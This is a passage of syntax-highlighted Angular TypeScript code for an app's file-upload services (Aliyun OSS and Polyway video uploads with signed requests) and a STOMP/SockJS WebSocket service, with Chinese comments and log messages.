          <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">customReq</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            observe<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
            observe<span class="token punctuation">.</span><span class="token function">unsubscribe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
          observe<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          observe<span class="token punctuation">.</span><span class="token function">unsubscribe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> <span class="token function-variable function">error</span> <span class="token operator">=</span> <span class="token parameter">err</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        observe<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        observe<span class="token punctuation">.</span><span class="token function">unsubscribe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">;</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>httpService<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'res/oss/getPolicy'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> dir<span class="token operator">:</span> uploadDir <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function-variable function">customReq</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">file</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> key <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>uploadData<span class="token punctuation">.</span>dir <span class="token operator">+</span> ToolsUtil<span class="token punctuation">.</span><span class="token function">getRandomFileName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> ToolsUtil<span class="token punctuation">.</span><span class="token function">getFileExt</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'OSSAccessKeyId'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>uploadData<span class="token punctuation">.</span>accessKeyId<span class="token punctuation">)</span><span class="token punctuation">;</span>
    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'policy'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>uploadData<span class="token punctuation">.</span>policy<span class="token punctuation">)</span><span class="token punctuation">;</span>
    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'Signature'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>uploadData<span class="token punctuation">.</span>signature<span class="token punctuation">)</span><span class="token punctuation">;</span>
    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'key'</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'success_action_status'</span><span class="token punctuation">,</span> <span class="token string">'200'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> file <span class="token keyword">as</span> any<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// this.uploadData.host!</span>
    <span class="token keyword">const</span> req <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HttpRequest</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> environment<span class="token punctuation">.</span><span class="token constant">OSS_URL</span><span class="token punctuation">,</span> formData<span class="token punctuation">,</span> <span class="token punctuation">{</span>
      reportProgress<span class="token operator">:</span> <span class="token boolean">true</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Observable</span><span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token parameter">observe</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> <span class="token function-variable function">success</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">event<span class="token operator">:</span> HttpEvent<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>type <span class="token operator">===</span> HttpEventType<span class="token punctuation">.</span>UploadProgress<span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>event <span class="token keyword">instanceof</span> <span class="token class-name">HttpResponse</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token comment">// const url = event.url + key;</span>
          observe<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>key<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          observe<span class="token punctuation">.</span><span class="token function">unsubscribe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> <span class="token function-variable function">error</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        observe<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        observe<span class="token punctuation">.</span><span class="token function">unsubscribe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">;</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>httpClient<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// upload-polyway.service.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>Injectable<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>HttpService<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./http.service'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>HttpRequest<span class="token punctuation">,</span> HttpClient<span class="token punctuation">,</span> HttpEvent<span class="token punctuation">,</span> HttpResponse<span class="token punctuation">,</span> HttpEventType<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/common/http'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>environment<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'src/environments/environment'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>NzMessageService<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'ng-zorro-antd/message'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>hex_sha1<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'../utils/sha1'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ServicesModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@app/service/service.module'</span><span class="token punctuation">;</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  providedIn<span class="token operator">:</span> ServicesModule
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">UploadPolywayService</span> <span class="token punctuation">{</span>
  percent <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function-variable function">percentReport</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">percent<span class="token operator">:</span> number</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token keyword">void</span><span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter"><span class="token keyword">private</span> httpService<span class="token operator">:</span> HttpService<span class="token punctuation">,</span> <span class="token keyword">private</span> httpClient<span class="token operator">:</span> HttpClient<span class="token punctuation">,</span> <span class="token keyword">private</span> nzMsg<span class="token operator">:</span> NzMessageService</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">}</span>
  <span class="token function-variable function">uploadPolyway</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">file</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">customReq</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function-variable function">customReq</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">uploadXhrArgs</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> that <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>percentReport <span class="token operator">=</span> uploadXhrArgs<span class="token punctuation">.</span>percentReport<span class="token punctuation">;</span>
    <span class="token keyword">const</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token constant">JSONRPC</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      title<span class="token operator">:</span> uploadXhrArgs<span class="token punctuation">.</span>name<span class="token punctuation">,</span>
      tag<span class="token operator">:</span> uploadXhrArgs<span class="token punctuation">.</span>name<span class="token punctuation">,</span>
      desc<span class="token operator">:</span> uploadXhrArgs<span class="token punctuation">.</span>name
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'JSONRPC'</span><span class="token punctuation">,</span> <span class="token constant">JSONRPC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'Filedata'</span><span class="token punctuation">,</span> uploadXhrArgs<span class="token punctuation">.</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>
    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'writetoken'</span><span class="token punctuation">,</span> environment<span class="token punctuation">.</span>writetoken<span class="token punctuation">)</span><span class="token punctuation">;</span>
    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'cataid'</span><span class="token punctuation">,</span> environment<span class="token punctuation">.</span>cataid<span class="token punctuation">)</span><span class="token punctuation">;</span>
    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'fcharset'</span><span class="token punctuation">,</span> <span class="token string">'ISO-8859-1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> sign <span class="token operator">=</span> <span class="token function">hex_sha1</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">cataid=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>environment<span class="token punctuation">.</span>cataid<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&amp;JSONRPC=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token constant">JSONRPC</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">&amp;writetoken=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>environment<span class="token punctuation">.</span>writetoken<span class="token interpolation-punctuation punctuation">}</span></span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>environment<span class="token punctuation">.</span>secretkey<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'sign'</span><span class="token punctuation">,</span> sign<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// this.uploadData.host!</span>
    <span class="token keyword">const</span> req <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HttpRequest</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> environment<span class="token punctuation">.</span>polywayUpload <span class="token operator">+</span> <span class="token string">'uc/services/rest/?method=uploadfile'</span><span class="token punctuation">,</span> formData<span class="token punctuation">,</span> <span class="token punctuation">{</span>
      reportProgress<span class="token operator">:</span> <span class="token boolean">true</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>httpService<span class="token punctuation">.</span>originalHttpClient<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span>
      <span class="token punctuation">(</span><span class="token parameter">event<span class="token operator">:</span> HttpEvent<span class="token operator">&lt;</span>any<span class="token operator">&gt;</span></span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>type <span class="token operator">===</span> HttpEventType<span class="token punctuation">.</span>UploadProgress<span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>total <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token string">'percent'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
              configurable<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
              <span class="token keyword">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> that<span class="token punctuation">.</span>percent<span class="token punctuation">;</span>
              <span class="token punctuation">}</span><span class="token punctuation">,</span>
              <span class="token keyword">set</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>that<span class="token punctuation">.</span>percentReport<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                  that<span class="token punctuation">.</span><span class="token function">percentReport</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                that<span class="token punctuation">.</span>percent <span class="token operator">=</span> val<span class="token punctuation">;</span>
              <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">(</span>event <span class="token keyword">as</span> any<span class="token punctuation">)</span><span class="token punctuation">.</span>percent <span class="token operator">=</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>loaded <span class="token operator">/</span> event<span class="token punctuation">.</span>total<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          uploadXhrArgs<span class="token punctuation">.</span><span class="token function">onProgress</span><span class="token punctuation">(</span>
            event<span class="token punctuation">,</span>
            uploadXhrArgs<span class="token punctuation">.</span>file
          <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>event <span class="token keyword">instanceof</span> <span class="token class-name">HttpResponse</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>body<span class="token punctuation">.</span>error <span class="token operator">===</span> <span class="token string">'0'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            uploadXhrArgs<span class="token punctuation">.</span><span class="token function">onSuccess</span><span class="token punctuation">(</span>
              event<span class="token punctuation">.</span>body<span class="token punctuation">,</span>
              uploadXhrArgs<span class="token punctuation">.</span>file<span class="token punctuation">,</span>
              event
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            uploadXhrArgs<span class="token punctuation">.</span><span class="token function">onError</span><span class="token punctuation">(</span>
              <span class="token string">'错误码'</span> <span class="token operator">+</span> event<span class="token punctuation">.</span>body<span class="token punctuation">.</span>error<span class="token punctuation">,</span>
              uploadXhrArgs<span class="token punctuation">.</span>file<span class="token punctuation">,</span>
            <span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>nzMsg<span class="token punctuation">.</span><span class="token function">warning</span><span class="token punctuation">(</span><span class="token string">'上传错误，保利威错误码'</span> <span class="token operator">+</span> event<span class="token punctuation">.</span>body<span class="token punctuation">.</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        uploadXhrArgs<span class="token punctuation">.</span><span class="token function">onError</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> uploadXhrArgs<span class="token punctuation">.</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// websocket.service.ts</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Injectable<span class="token punctuation">,</span> EventEmitter<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> environment <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'src/environments/environment'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Observable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'rxjs'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>ServicesModule<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@app/service/service.module'</span><span class="token punctuation">;</span>
declare <span class="token keyword">const</span> SockJS<span class="token punctuation">;</span>
declare <span class="token keyword">const</span> Stomp<span class="token punctuation">;</span>
@<span class="token function">Injectable</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  providedIn<span class="token operator">:</span> ServicesModule
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">WebSocketService</span> <span class="token punctuation">{</span>
  stompClient<span class="token operator">:</span> any<span class="token punctuation">;</span>
  connectSuccess <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  waitingSubscribeList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span>
  <span class="token keyword">public</span> <span class="token function">connectSocket</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 开启socket连接</span>
    <span class="token keyword">const</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SockJS</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>environment<span class="token punctuation">.</span><span class="token constant">SERVER_URL</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">msg/realTime</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    window<span class="token punctuation">[</span><span class="token string">'socket'</span><span class="token punctuation">]</span> <span class="token operator">=</span> socket<span class="token punctuation">;</span>
    <span class="token keyword">const</span> stompClient <span class="token operator">=</span> Stomp<span class="token punctuation">.</span><span class="token function">over</span><span class="token punctuation">(</span>socket<span class="token punctuation">)</span><span class="token punctuation">;</span>
    stompClient<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">message</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'成功连接websocket'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>connectSuccess <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
      <span class="token comment">// 订阅一个目的地</span>
      <span class="token comment">// STOMP消息的body必须为字符串</span>
      <span class="token comment">// stompClient.subscribe('/topic/greetings', (msg) =&gt; {</span>
      <span class="token comment">//   console.log('接受到java后台发送的消息，' + msg.body);</span>
      <span class="token comment">// });</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>waitingSubscribeList<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 存在等待建立的连接</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>waitingSubscribeList<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">item</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
          console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">与服务器建立一个连接，路径：</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>item<span class="token punctuation">.</span>path<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          item<span class="token punctuation">.</span>observe<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stompClient<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span>item<span class="token punctuation">.</span>path<span class="token punctuation">,</span> item<span class="token punctuation">.</span>callback<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>stompClient <span class="token operator">=</span> stompClient<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">public</span> <span class="token function">addSubscribe</span><span class="token punctuation">(</span><span class="token parameter">path<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Observable</span><span class="token operator">&lt;</span>any<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token parameter">observe</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>connectSuccess<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 已开启连接</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">与服务器建立一个连接，路径：</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>path<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        observe<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stompClient<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> callback<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>waitingSubscribeList<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span> observe<span class="token punctuation">,</span> path<span class="token punctuation">,</span> callback<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'socket尚未连接，等到建立:'</span> <span class="token operator">+</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token comment">// 推送消息</span>
  <span class="token keyword">public</span> <span class="token function">sendMessage</span><span class="token punctuation">(</span><span class="token parameter">path<span class="token punctuation">,</span> header<span class="token punctuation">,</span> params</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>stompClient<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> header<span class="token punctuation">,</span> params<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token comment">// 关闭连接</span>
  <span class="token keyword">public</span> <span class="token function">closeSocket</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>stompClient <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>stompClient<span class="token punctuation">.</span><span class="token function">disconnect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'断开socket连接'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

